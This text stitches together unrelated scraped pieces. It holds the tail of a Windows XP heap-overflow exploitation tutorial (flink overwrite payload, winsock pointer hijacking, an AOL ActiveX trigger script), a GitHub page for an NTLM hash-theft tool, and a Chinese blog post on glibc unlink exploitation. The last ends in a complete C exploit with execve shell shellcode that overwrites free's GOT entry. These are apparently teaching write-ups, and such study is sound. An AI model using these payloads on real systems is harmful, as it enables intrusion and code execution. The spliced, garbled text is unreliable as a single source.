FastPEBLockRoutine() is located at 0x7ffdf020.\nSimply uncomment this line:\n\/\/ strcpy(a,\"XXXXXXXXXXXXXXXXAAAABBBB\\x20\\xf0\\xfd\\x7f\");\nand comment out this line:\ngets(a);\nSo now we will overflow chunk A X's and overflow into chunk B's\nmetadata with AAAA and BBBB and finally overwrite chunk B's flink with\n0x7ffdf020. Recompile and load it into the debugger. Now when we\nallocate chunk C (pointed to by 0x7ffdf020), we can fill the chunk with\nshellcode and it will be called when an exception occurs. Below, we can\nsee the following code setting up EAX to contain the PEB location and a\ndirect call is made at offset 0x20 (FastPEBLockRoutine()) transferring\nexecution to our code.\n[FastPEBLockRoutine.png]\nNow we have direct control over EIP and can use it to return into code.\nFrom here it is trivial to bypass DEP and get code execution.\nApplication specific pointer exploitation:\nThis article would not be complete unless I provided an example of\nexploiting this vulnerability using an application specific pointer\nunder Windows XP SP3. When targeting software that contains a heap\noverflow, any hard-coded function call that can be written to and is\nexecuted after the overflow's occurrence too should be targeted and\nabused. Take for example, WSACleanup() from winsock, it contains a\nhardcoded function call at 0x71ab400a under XP SP3. This can be used as\na location in memory that we can write our shellcode too. That way when\nthe WSACleanup() (or many other winsock functions) are executed, it\nwill redirect back to shellcode. Below is the disassembly of\nWSACleanup() and finding the hardcoded function call.\n[wsacleanup.png]\nAlmost any networking application under windows is likely to use\nexported function calls from winsock and specially WSACleanup() is used\nto clean up any socket connections and as such almost guaranteed to be\nexecuted after a heap overflow. Because of this, using this function\npointer (0x71ac4050) to overwrite at seems to work quite consistently.\nAs another example shows, the recv() function also contains a call to\nthe same function.\n[recv1.png]\nIf we follow the function call at 0x71ab678f, we can see we land here:\n[recv2.png]\nWhat do you know? another deference call at 0x71ac4050, just to confirm\nthat this will succeed, lets look at the access permissions of the\nmemory.\n[winsockdata.png]\nThe fundamental problem with this technique is that because you will be\noverwriting at that location, any shellcode that uses winsock\n(practically all i might add) will fail. One way to solve this is to\npatch the 0x71ac4050 location with the original code again so that\nwinsock calls will work.\nApplication specific heap exploitation example:\nI have provided a vulnerserver binary (most of the code is used from\nStephen Bradshaws blog entry at the [22]infosec institute, all credits\nshould go to him) and adjusted it accordingly to contain heap overflows\nand memleaks.\nThe idea is to build a 'PoC' exploit that will trigger and layout the\nheap in the right way so that you can overwrite a chunk on the\nlookaside and gain code execution. Download this (b33f: File not\navailable) file and run it under windows XP SP 3 and try the examples\nprovided here to help you grasp the concept of this technique. I have\ndecided not to share the source code for now so that people will have\nto do some reverse engineering in order to find the right way to layout\nthe heap and trigger code execution. As a hint (hopefully not too big),\nhere is a screenshot of the 'PoC' code working by determining the heap\nlayout:\n[proof.png]\nOf course, any situation in which you can layout heap memory is\nperfect. An easier target for laying out a target processes heap is to\nuse the client side as a reliable way. With the ability to script and\ncontrol heap layouts, you are sure to be able to setup a situation in\nthat can be exploited via a heap overflow. An example is using Alex\nSoritov's heaplib.js to help allocate, free and perform many other\noperations on strings within heap memory. If using JavaScript or DHTML\nto allocate or free chunks in the same heap used by MSHTML, then you\ncan control the heap manager and you can redirect execution control\nfrom a heap overflow in the target browser.\nAnalysis of AOL 9.5 (CDDBControl.dll) ActiveX Heap Overflow\nI decided to take a look at this vulnerability and determine the\n'exploitability' of this bug under windows XP SP3. Despite the control\nbeing marked not safe for scripting or initialization, I thought it\nmight be an interesting bug to analyse. I wouldn't have added this\nsection, but [23]sinn3r asked, so I decided to add it :) Now due to it\nbeing within an ActiveX control, one of the ways that it can be\ntriggered is through IE's browser using a scripting language of choice.\nI decided to use JavaScript simply because it was the most flexible and\nheapLib.js was also written in it.\nMy environment was as follows:\n- IE 6\/7\n- XP SP3\n- heapLib.js\nSo let the fun begin! First of all I triggered the PoC provided at\n[24]exploit-db by Hellcode Research. Lets analyse the crash:\n[fail2.png]\nWhat we can see here is the segment in the current heap actually runs\nout of uncommitted memory and cannot commit more memory for that heap\nsegment.\n[fail3.png]\nAnd if we view it:\n[fail4.png]\n[fail7.png]\nWe run out of the heap segment without the ability to create another\nsegment. So what do we do? Well we know that we have to trigger an\nunlink operation. In order to do that, we need the windows heap manager\nto copy all the data into the allocate buffer (overwriting other\nchunks) but not running off the current segment. Then when the next\nallocation or free is triggered, it will attempt to unlink. I modified\nthe PoC to trigger the overflow with only 2240 bytes instead of 4000.\nvar x = unescape(\"%41\");\nwhile (x.length<2240) x += x;\nx = x.substring(0,2240);\ntarget.BindToFile(x,1);\nNow when we trigger the bug, we don't actually crash the browser. Of\ncourse the chunk is overflowed, but until there is another unlink\noperation, it will not crash. But when closing the browser, the garbage\ncollector runs and allocates all freed chunks and as such multiple\ncalls to RtlAllocateHeap() are made and the bug is triggered. This\ntime, things look a little more realistic.\n[fail5.png]\n(384c.16e0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=41414141 ebx=02270000 ecx=02273f28 edx=02270178 esi=02273f20 edi=41414141\neip=7c9111de esp=0013e544 ebp=0013e764 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nntdll!RtlAllocateHeap+0x567:\n7c9111de 8b10            mov     edx,dword ptr [eax]  ds:0023:41414141=????????\nGreat, so we have a potentially exploitable condition. In this case,\nflink is EAX and blink is EDI. Under XP sp0-1 and below, we could\nsimply perform a basic UEF function overwrite and take control. But we\nhave access to the browsers powerful scripting ability to 'massage' the\nheap so we will try targeting the vulnerability under XP SP3. When\nanalysing the heap layouts, I quickly noticed that the Active X control\nactually creates its own heap at run time and the crash is triggered on\na freelist insert.\n[fail6.png]\nWhen using the heapLib.js library, I was able to successfully\nmanipulate the heap quite well, that is, the default processes heap\n**not** the active X controls heap. At this point, I can somewhat say\nthat under Windows XP SP3 and above it *seems* to be unexploitable, of\ncourse this could be a gross misinterpretation but as far as I can\ntell, if the objects heap cannot be manipulated, then it cannot be\nexploited.\nHooking:\nA useful tip to know when debugging applications that contain a heap\noverflow is the number of allocations and frees and what size they are.\nDuring a process\/threads life, many allocations and frees are made and\nit certainly is time intensive to breakpoint all of them. One neat\nthing with immunity debugger is that you can use the !hookheap plugin\nto hook RtlAllocateHeap() and RtlFreeHeap() and so you can find the\nsize and number of allocations\/frees that are executed during any\nparticular operation.\n[hook1.png]\nAnd as you can see, one particular allocation stands out, an allocation\nof a large number of bytes seems to indicate a request to the target\nvulnerable server.\nConclusion\nHeap managers are very complex to understand and to exploit heap\noverflows requires many man hours as each situation is different.\nUnderstanding the current context of the target application and\nlimitations contained within it are key to determining the\nexploitability of a heap overflow. The protection mitigation's enforced\nby Microsoft prevent majority of heap overflow exploitation in a\ngeneric sense, however from time to time we see application specific\nsituations that arise and can be abused by an attacker.\nReferences:\n- http:\/\/windbg.info\/doc\/1-common-cmds.html\n- http:\/\/www.insomniasec.com\/publications\/Heaps_About_Heaps.ppt\n- http:\/\/cybertech.net\/~sh0ksh0k\/projects\/winheap\/XPSP2 Heap\nExploitation.ppt\n- some small aspects from:\nhttp:\/\/illmatics.com\/Understanding_the_LFH.pdf\n-\nhttp:\/\/www.blackhat.com\/presentations\/win-usa-04\/bh-win-04-litchfield\/b\nh-win-04-litchfield.ppt\n-\nhttp:\/\/www.insomniasec.com\/publications\/Exploiting_Freelist[0]_On_XPSP2\n.zip\n- http:\/\/www.insomniasec.com\/publications\/DEPinDepth.ppt (heap segment\ninformation)\n- Advanced windows Debugging (Mario Hewardt)\n- www.ptsecurity.com\/download\/defeating-xpsp2-heap-protection.pdf\n- http:\/\/grey-corner.blogspot.com\/2010\/12\/introducing-vulnserver.html\n-\nhttp:\/\/www.immunityinc.com\/downloads\/immunity_win32_exploitation.final2\n.ppt\n- Understanding and bypassing Windows Heap Protection by Nicolas\nWaisman (2007):\nhttp:\/\/kkamagui.springnote.com\/pages\/1350732\/attachments\/579350\n\u00a9 Copyright [25]FuzzySecurity\n[26]Home | [27]Tutorials | [28]Scripting | [29]Exploits | [30]Links |\n[31]Contact"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]eladshamir \/ [31]Internal-Monologue Public\n* [32]Notifications\n* [33]Fork 245\n* [34]Star 1.3k (BUTTON)\n*\nInternal Monologue Attack: Retrieving NTLM Hashes without Touching\nLSASS\n[35]1.3k stars [36]245 forks [37]Branches [38]Tags [39]Activity\n[40]Star (BUTTON)\n[41]Notifications\n* [42]Code\n* [43]Pull requests 0\n* [44]Actions\n* [45]Security\n* [46]Insights\n(BUTTON) Additional navigation options\n* [47]Code\n* [48]Pull requests\n* [49]Actions\n* [50]Security\n* [51]Insights\neladshamir\/Internal-Monologue\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nAbout\nInternal Monologue Attack: Retrieving NTLM Hashes without Touching\nLSASS\nResources\n[52]Readme\n[53]Activity\nStars\n[54]1.3k stars\nWatchers\n[55]54 watching\nForks\n[56]245 forks\n[57]Report repository\n[58]Releases\nNo releases published\n[59]Packages 0\nNo packages published\n[60]Contributors 4\n*\n*\n*\n*\nLanguages\n* [61]C# 100.0%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [62]Terms\n* [63]Privacy\n* [64]Security\n* [65]Status\n* [66]Docs\n* [67]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"# 0x00 beginning\n\n\u8fd9\u4e2a post \u4e3b\u8981\u8bb0\u5f55\u5b66\u4e60 32 \u4f4d linux \u4e0b\u5806\u6ea2\u51fa\u4f7f\u7528\u7684 unlink \u6280\u672f, \u4f9d\u8d56\u5230`ptmalloc2`\u90a3\u90e8\u5206\u7684\u77e5\u8bc6, \u5b9e\u9a8c\u4e3b\u8981\u53d6\u81ea [^orgin], \u66f4\u591a\u7406\u8bba\u6765\u81ea [^phrack] \u4e0e [^internal].\n\n## prepare\n\n\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u4ee3\u7801\n\n```c\n#include <stdlib.h>\n#include <string.h>\n\nint main( int argc, char * argv[] )\n{\n        char * first, * second;\n\n\/*[1]*\/ first = malloc( 666 );\n\/*[2]*\/ second = malloc( 12 );\n        if(argc!=1)\n\/*[3]*\/         strcpy( first, argv[1] );\n\/*[4]*\/ free( first );\n\/*[5]*\/ free( second );\n\/*[6]*\/ return( 0 );\n}\n```\n\n\u4ee3\u7801\u5f88\u5bb9\u6613\u8bfb\u61c2, \u5c31\u662f\u4ece\u547d\u4ee4\u884c\u8bfb\u53d6\u7b2c\u4e8c\u4e2a\u53c2\u6570 (argv[1]) \u4e0d\u52a0\u6821\u9a8c\u590d\u5236\u5230\u7f13\u51b2\u533a first, \u5982\u679c argv[1] \u6240\u6307\u7684\u5b57\u7b26\u4e32\u5927\u4e8e 666 \u5b57\u8282\u5c31\u4f1a\u5728\u5806\u7a7a\u95f4\u53d1\u751f\u6ea2\u51fa, \u5177\u4f53\u4f1a\u8986\u76d6\u6389\u4e0b\u4e00\u4e2a`chunk header`, \u8fd9\u53ef\u80fd\u4f1a\u5bfc\u4efb\u610f\u4ee3\u7801\u6267\u884c.\n\u56fe\u793a\u5185\u5b58\u5e03\u5c40:\n![unlink](..\/media\/pic\/heap\/overflow_unlink.png)\n\n# 0x10 depending\n\n\u8fd9\u4e2a\u6280\u672f\u4e3b\u8981\u601d\u8def\u662f\u620f\u5f04`glibc malloc`\u7684\u5185\u5b58\u56de\u6536\u673a\u5236, \u8bb2\u4e0a\u9762\u5185\u5b58\u5e03\u5c40\u4e2d\u7684`second chunk`\u7ed9`unlink`\u6389, \u5e76\u4e14\u5728`unlink`\u7b2c\u4e8c\u4e2a`chunk`\u671f\u95f4\u5c06\u4f1a\u8986\u5199 free \u51fd\u6570\u7684 got \u8868\u9879\u4e3a shellcode \u7684\u5730\u5740! \u5728\u6210\u529f\u8986\u5199\u8fc7\u540e, \u5728 [5] \u8c03\u7528`free`\u65f6`shellcode`\u5c06\u4f1a\u88ab\u6267\u884c, \u770b\u4e0a\u9762\u64cd\u4f5c\u53ef\u4ee5\u53d1\u73b0\u5176\u6838\u5fc3\u5c31\u662f\u5728`unlink`\u64cd\u4f5c\u4e0a.\n\n```c\n#define unlink(AV, P, BK, FD) {                                            \\\n    FD = P->fd;\t\t\t\t\t\t\t\t      \\\n    BK = P->bk;\t\t\t\t\t\t\t\t      \\\n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t      \\\n      malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\\n    else {\t\t\t\t\t\t\t\t      \\\n              if (!in_smallbin_range(size))\n\t{\n\t  p->fd_nextsize = NULL;\n\t  p->bk_nextsize = NULL;\n\t}\n      bck->fd = p;\n      fwd->bk = p;\n\n      set_head(p, size | PREV_INUSE);\n      set_foot(p, size);\n\n      check_free_chunk(av, p);\n    }\nFD->bk = BK;\t\t\t\t\t\t\t      \\\n        BK->fd = FD;\t\t\t\t\t\t\t      \\\n        if (!in_smallbin_range (P->size)\t\t\t\t      \\\n            && __builtin_expect (P->fd_nextsize != NULL, 0)) {\t\t      \\\n\t    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t      \\\n\t\t|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \\\n\t      malloc_printerr (check_action,\t\t\t\t      \\\n\t\t\t       \"corrupted double-linked list (not small)\",    \\\n\t\t\t       P, AV);\t\t\t\t\t      \\\n            if (FD->fd_nextsize == NULL) {\t\t\t\t      \\\n                if (P->fd_nextsize == P)\t\t\t\t      \\\n                  FD->fd_nextsize = FD->bk_nextsize = FD;\t\t      \\\n                else {\t\t\t\t\t\t\t      \\\n                    FD->fd_nextsize = P->fd_nextsize;\t\t\t      \\\n                    FD->bk_nextsize = P->bk_nextsize;\t\t\t      \\\n                    P->fd_nextsize->bk_nextsize = FD;\t\t\t      \\\n                    P->bk_nextsize->fd_nextsize = FD;\t\t\t      \\\n                  }\t\t\t\t\t\t\t      \\\n              } else {\t\t\t\t\t\t\t      \\\n                P->fd_nextsize->bk_nextsize = P->bk_nextsize;\t\t      \\\n                P->bk_nextsize->fd_nextsize = P->fd_nextsize;\t\t      \\\n              }\t\t\t\t\t\t\t\t      \\\n          }\t\t\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n}\n```\n\n\u5982\u679c\u6ca1\u6709\u653b\u51fb\u7684\u5f71\u54cd free \u51fd\u6570\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\n\n## 1) \u68c0\u67e5 non mmapped chunk\n\n\u68c0\u67e5`non mmapped chunk`\u540e\u8fdb\u884c\u5411\u524d\u6216\u8005\u5411\u540e\u5408\u5e76\u3002\n\n```c\nstatic void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{\n...\n  \/*\n    Consolidate other non-mmapped chunks as they arrive.\n  *\/\n\n  else if (!chunk_is_mmapped(p)) {\n    if (! have_lock) {\n      (void)mutex_lock(&av->mutex);\n      locked = 1;\n    }\n\n    nextchunk = chunk_at_offset(p, size);\n\n    \/* Lightweight tests: check whether the block is already the\n       top block.  *\/\n    if (__glibc_unlikely (p == av->top))\n      {\n\terrstr = \"double free or corruption (top)\";\n\tgoto errout;\n      }\n    \/* Or whether the next chunk is beyond the boundaries of the arena.  *\/\n    if (__builtin_expect (contiguous (av)\n\t\t\t  && (char *) nextchunk\n\t\t\t  >= ((char *) av->top + chunksize(av->top)), 0))\n      {\n\terrstr = \"double free or corruption (out)\";\n\tgoto errout;\n      }\n    \/* Or whether the block is actually not marked used.  *\/\n    if (__glibc_unlikely (!prev_inuse(nextchunk)))\n      {\n\terrstr = \"double free or corruption (!prev)\";\n\tgoto errout;\n      }\n\n    nextsize = chunksize(nextchunk);\n...    \n```\n\n## 2) \u5411\u540e\u5408\u5e76\n\n### \u67e5\u770b previous chunk \u662f\u5426\u5904\u4e8e free \u72b6\u6001\n\n```c\nstatic void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{\n...\n    \/* consolidate backward *\/\n    if (!prev_inuse(p)) { \/\/ here is\n      prevsize = p->prev_size;\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      unlink(av, p, bck, fwd);\n    }\n```\n\n\u5982\u679c\u5f53\u524d\u88ab\u91ca\u653e\u7684 chunk \u7684 P (PREV_INUSE) \u4f4d\u6ca1\u6709\u88ab\u8bbe\u7f6e,\u5219\u8bf4\u660e\u524d chunk \u662f\u5904\u4e8e free\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0cprevious chunk \u81ea`first`\u7684 P \u4f4d\u7531\u662f\u88ab\u5206\u914d\u51fa\u53bb\u7684,\u56e0\u4e3a default chunk \u524d\u9762\u662f\u5806\u7684\u6700\u9760\u524d\u4f4d\u7f6e\u88ab\u7ea6\u5b9a\u4e3a\u5206\u914d\u7684(\u5373\u4f7f\u5b83\u4e0d\u5b58\u5728)\u3002\n\n### \u5982\u679c\u5904\u4e8e free \u72b6\u6001\u5219\u5408\u5e76\n\n```c\nstatic void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{...\n      prevsize = p->prev_size;\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      unlink(av, p, bck, fwd); \/\/ here is\n```\n\n\u4e5f\u5c31\u662f\u8bf4\uff0c\u628a`previous chunk`\u81ea\u5b83\u7684`binlist`\u79fb\u9664\uff0c\u628a`previous chunk`\u7684\u5927\u5c0f\u589e\u52a0\u5230\u5f53\u524d\u7684`chunk`\u5e76\u4fee\u6539`chunk`\u7684\u6307\u9488\u6307\u5411`previous chunk`\u3002\u56e0\u4e3a\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d`previous chunk`\u662f\u88ab\u5206\u914d\u51fa\u53bb\u7684\uff0c\u6240\u4ee5`unlink`\u6ca1\u6709\u88ab\u89e6\u53d1\uff0c\u8fd9\u6837\u7684\u8bdd\u5f53\u524d\u7684\u88ab\u91ca\u653e\u7684`first`\u4e0d\u4f1a\u88ab\u5411\u540e\u5408\u5e76\u3002\n\n## 3) \u5411\u524d\u5408\u5e76\n\n### \u67e5\u770b next chunk \u662f\u5426\u5904\u4e8e free \u72b6\u6001\n\n```c\nstatic void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{\n...\n    \/* consolidate backward *\/\n    if (!prev_inuse(p)) { \/\/ here is\n      prevsize = p->prev_size;\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      unlink(av, p, bck, fwd);\n    }\n\n    if (nextchunk != av->top) {\n      \/* get and clear inuse bit *\/\n      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n      ...\n```\n\n\u5982\u679c\u4e0b\u4e0b\u4e2a`chunk`\u7684 P \u672a\u88ab\u7f6e\u4f4d,\u5219`next chunk`\u662f`free`\u72b6\u6001\u3002\u9760\u5bfc\u822a\u5230\u4e0b\u4e0b\u4e2a`chunk`\uff0c\u589e\u52a0\u5f53\u524d\u88ab\u91ca\u653e\u7684`chunk`\u7684\u7a7a\u95f4\u5230\u5b83\u7684`chunk`\u6307\u9488\uff0c\u7136\u540e\u589e\u52a0\u4e0b\u4e00\u4e2a`chunk`\u7684 size \u5230\u4e0b\u4e2a`chunk`\u6307\u9488\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\u4e0b\u4e0b\u4e2a`chunks`\u662f\u88ab\u56de\u6536\u7684\uff0cfirst's chunk \u662f\u4e00\u4e2a`top chunk`\u800c\u4e14\u5b83\u7684`PREV_INUSE`\u662f\u88ab\u7f6e\u4f4d\u7684,\u8fd9\u8868\u660e\u540e\u9762\u7684`chunk`\u662f\u5373 second `chunk`\u4e0d\u662f free \u72b6\u6001\u3002\n\n### \u5982\u679c\u5904\u4e8e free \u72b6\u6001\u5219\u5408\u5e76\n\n```c\nstatic void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{\n...\n    if (nextchunk != av->top) {\n      \/* get and clear inuse bit *\/\n      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n      \/* consolidate forward *\/\n      if (!nextinuse) {\n\tunlink(av, nextchunk, bck, fwd); \/\/ here is\n\tsize += nextsize;\n      } else\n\tclear_inuse_bit_at_offset(nextchunk, 0);\n    ...\n```\n\n`next chunk`\u6765\u81ea\u5b83\u7684`binlist` \u628a`next chunk`\u7684\u7a7a\u95f4\u589e\u52a0\u5230\u5f53\u524d`chunk`\u4e2d\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0c`next chunk`\u662f\u88ab\u5206\u914d\u51fa\u53bb\u7684\uff0c\u56e0\u6b64`unlink`\u662f\u4e0d\u4f1a\u88ab\u8c03\u7528\u7684\uff0c\u8fd9\u4e2a\u60c5\u51b5\u4e0b\u5f53\u524d\u88ab\u56de\u6536\u7684 first `chunk`\u662f\u4e0d\u4f1a\u50cf\u524d\u5408\u5e76\u7684\u3002\n\n## 4) \u5408\u5e76`chunk`\u5230`unsorted bin`\n\n```c\nstatic void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{\n  INTERNAL_SIZE_T size;        \/* its size *\/\n  mfastbinptr *fb;             \/* associated fastbin *\/\n  mchunkptr nextchunk;         \/* next contiguous chunk *\/\n  INTERNAL_SIZE_T nextsize;    \/* its size *\/\n  int nextinuse;               \/* true if nextchunk is used *\/\n  INTERNAL_SIZE_T prevsize;    \/* size of previous contiguous chunk *\/\n  mchunkptr bck;               \/* misc temp for linking *\/\n  mchunkptr fwd;               \/* misc temp for linking *\/\n  ...\n      \/*\n\tPlace the chunk in unsorted chunk list. Chunks are\n\tnot placed into regular bins until after they have\n\tbeen given one chance to be used in malloc.\n      *\/\n\n      bck = unsorted_chunks(av);\n      fwd = bck->fd;\n      if (__glibc_unlikely (fwd->bk != bck))\n\t{\n\t  errstr = \"free(): corrupted unsorted chunks\";\n\t  goto errout;\n\t}\n      p->fd = fwd;\n      p->bk = bck;\n      if (!in_smallbin_range(size))\n\t{\n\t  p->fd_nextsize = NULL;\n\t  p->bk_nextsize = NULL;\n\t}\n      bck->fd = p;\n      fwd->bk = p;\n\n      set_head(p, size | PREV_INUSE);\n      set_foot(p, size);\n\n      check_free_chunk(av, p);\n    }\n...\n```\n\n\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u5408\u5e76\u53d1\u751f\u3002\n\n# 0x20 practice\n\n\u73b0\u5728\u5728\u6765\u770b`strcpy( first, argv[1] )`\u8986\u5199`chunk`\u5934\u90e8\u7684\u6784\u9020\uff1a\n\n>\nprev_size = \u662f\u4e2a\u6570\u5b57\uff0c\u56e0\u6b64 PREV_INUSE \u4e0d\u4f1a\u88ab\u7f6e\u4f4d\u3002\nsize = -4\nfd = free address - 12\nbk = shellcode address\n\n\u5982\u679c\u653b\u51fb\u987a\u5229\u90a3\u4e48 line\uff3b4\uff3d\u5c06\u4f1a\u8fdb\u884c\u4e0b\u9762\u7684\u64cd\u4f5c:\n\n>\n* \u5bf9`non mmapped chunks`\u800c\u8a00\u53ef\u80fd\u6709\u4e24\u79cd\u5408\u5e76\u3002\n* \u5411\u540e\u5408\u5e76:\n1. \u67e5\u770b\u524d\u9762`previous chunk`\u7684 free \u72b6\u6001:\n2. \u5982\u679c\u662f free \u8003\u8651\u5408\u5e76:\n* \u5411\u524d\u5408\u5e76:\n1. \u5411\u540e\u67e5\u770b`next chunk`\u7684 free \u72b6\u6001:\n2. \u5982\u679c\u662f free \u8003\u8651\u5408\u5e76:\n\n\u56fe\u89e3\u793a\u4f8b\u6f0f\u6d1e\u7a0b\u5e8f\u5728\u6784\u9020\u51fa\u6765\u51fa\u7684\u6570\u636e\u8f93\u5165\u4e0b\u7684\u5185\u5b58\u5e03\u5c40:\n\n![unlink](..\/media\/pic\/heap\/unlink.png)\n\n## 0x21 compilation\n\n```shell\n$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=\/home\/sploitfun\/glibc\/glibc-inst2.20\/lib -Wl,--dynamic-linker=\/home\/sploitfun\/glibc\/glibc-inst2.20\/lib\/ld-linux.so.2\n```\n\n\u5b89\u88c5\u4e0a\u9762 shell \u63d0\u4f9b\u7684\u547d\u4ee4\u884c\u63d0\u4f9b\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u907f\u514d\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u673a\u5236\u6709\uff1aNX,RELRO,\u5f53\u7136 ASLR \u9700\u8981\u624b\u5de5\u5728\u64cd\u4f5c\u7cfb\u7edf\u91cc\u9762\u6682\u65f6\u5173\u95ed\u3002\n\n## 0x21 exploit\n\n\u7406\u89e3\u4e86\u4e0a\u9762 unlink \u7684\u6280\u672f\u7684\u672c\u8d28,\u5f00\u59cb\u52a8\u624b\u5199 exploit\u3002\n\n```c\n\/* Program to exploit 'vuln' using unlink technique.\n *\/\n#include <string.h>\n#include <unistd.h>\n\n#define FUNCTION_POINTER ( 0x0804978c )         \/\/Address of GOT entry for free function obtained using \"objdump -R vuln\".\n#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      \/\/Address of variable 'first' in vuln executable. \n\n#define VULNERABLE \".\/vuln\"\n#define DUMMY 0xdefaced\n#define PREV_INUSE 0x1\n\nchar shellcode[] =\n        \/* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function\n        (by statement BK->fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. \n        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*\/\n        \"\\xeb\\x0assppppffff\"\n        \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n\nint main( void )\n{\n        char * p;\n        char argv1[ 680 + 1 ];\n        char * argv[] = { VULNERABLE, argv1, NULL };\n\n        p = argv1;\n        \/* the fd field of the first chunk *\/\n        *( (void **)p ) = (void *)( DUMMY );\n        p += 4;\n        \/* the bk field of the first chunk *\/\n        *( (void **)p ) = (void *)( DUMMY );\n        p += 4;\n        \/* the fd_nextsize field of the first chunk *\/\n        *( (void **)p ) = (void *)( DUMMY );\n        p += 4;\n        \/* the bk_nextsize field of the first chunk *\/\n        *( (void **)p ) = (void *)( DUMMY );\n        p += 4;\n        \/* Copy the shellcode *\/\n        memcpy( p, shellcode, strlen(shellcode) );\n        p += strlen( shellcode );\n        \/* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize \n        of first chunk *\/\n        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );\n        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );\n        \/* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset *\/\n        *( (size_t *)p ) = (size_t)( DUMMY & ~PREV_INUSE );\n        p += 4;\n        \/* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*\/\n        *( (size_t *)p ) = (size_t)( -4 );\n        p += 4;\n        \/* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function\n        would do + 12 (FD->bk). This helps to overwrite the GOT entry of free with the address we have overwritten in \n        second chunk's bk field (see below) *\/\n        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );\n        p += 4;\n        \/* the bk field of the second chunk. It should point to shell code address.*\/\n        *( (void **)p ) = (void *)( CODE_ADDRESS );\n        p += 4;\n        \/* the terminating NUL character *\/\n        *p = '';\n\n        \/* the execution of the vulnerable program *\/\n        execve( argv[0], argv, NULL );\n        return( -1 );\n}\n\n```\n\n\u6267\u884c\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u65b0\u7684 shell 